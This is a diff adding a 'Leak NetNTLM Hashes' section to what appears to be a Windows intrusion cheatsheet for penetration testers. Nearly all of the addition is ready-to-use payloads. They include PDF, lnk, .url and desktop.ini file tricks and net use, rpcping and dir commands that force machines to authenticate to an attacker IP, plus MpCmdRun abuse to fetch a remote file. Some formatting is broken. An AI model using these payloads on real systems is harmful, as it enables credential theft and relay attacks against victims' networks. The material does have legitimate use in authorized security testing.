@@ -11,6 +11,7 @@ A cheatsheet in order to help during intrusion steps on Windows environment.
     - [Find valid credentials](#find-valid-credentials)
       - [AS REP Roast](#as-rep-roast)
       - [Responder](#responder)
+    - [Leak NetNTLM Hashes](#leak-netntlm-hashes)
   - [Post auth](#post-auth)
     - [Domain info](#domain-info)
       - [Powerview](#powerview)
@@ -123,6 +124,61 @@ In an internal network you can abuse old protocol (like NBT-NS or LLMNR) and gra
 # As root
 ./Responder.py -I eth0 -wrb
 ```
+
+#### Leak NetNTLM Hashes
+When getting access to services, it might be possible to retrieve the NetNTLM hashes. This hash can be cracked or relayed (if signing is not enable on the protocol). There is multiples ways to leak this hash, such as:
+```
+```
+###### PDF file
+/F (\\\\\\\\IP@80\\\\t)
+
+###### dubdoc
+///1.2.3.4@80/t
+###### Doc
+Target=file://1.2.3.4@80/t.dotx
+URL
+file://IP@80/t.htm
+###### lnk
+URL\=file://1.2.3.4@80/t.htm
+###### IconFile
+\\\\1.2.3.4@80\\t.ico
+###### rpcping
+rpcping -s 1.2.3.4 -e 1234 -a privacy -u NTLM
+###### dir
+dir \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe
+###### Net command + WebDAV envoke
+* net use \\\\1.2.3.4@80\\t
+* net use * \\\\1.2.3.4@SSL@443\\folder\\subfolder password /user:userID
+* net use * https://1.2.3.4:443/folder/subfolder password /user:userID
+* net use * http://1.2.3.4/folder/subfolder password /user:root
+* net use * \\\\1.2.3.4\\folder\\subfolder password /user:userID
+* net use \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe \. (the DavWWWRoot triggers WebDAV forcibly )
+* net use \\\\domain.site@80\\uri_folder\\index.html
+* net use * https://1.2.3.4:443/folder/subfolder password /user:userID
+* dir \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe
+
+###### Create .url file to leak using “ICO” request to file share
+Create a new TXT file and paste the following:<br/>
+[InternetShortcut]  <br/>
+URL=http://www.WeLoveResponder.com <br/>
+IconIndex=0  <br/>
+IconFile\=\\\\1.2.3.4\\L3\\3T.ico
+Rename the file from .txt to .url
+
+###### Create desktop.ini file to leak credentials using a folder
+mkdir Folder <br/>
+attrib +s Folder <br/>
+cd Folder <br/>
+echo [.ShellClassInfo] > desktop.ini <br/>
+echo IconResource\=\\\\1.2.3.4\\aa >> desktop.ini <br/>
+attrib +s +h desktop.ini
+
+###### Windows Defender MpCmdRun
+"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -Scan  -ScanType 3 -File \\\\Server.domain\\file.txt
+"c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -path \\\\Server.domain\\
+
+More on this [Github](https://github.com/Gl3bGl4z/All_NTLM_leak)
+
 ### Post Auth
 
 #### Domain Info
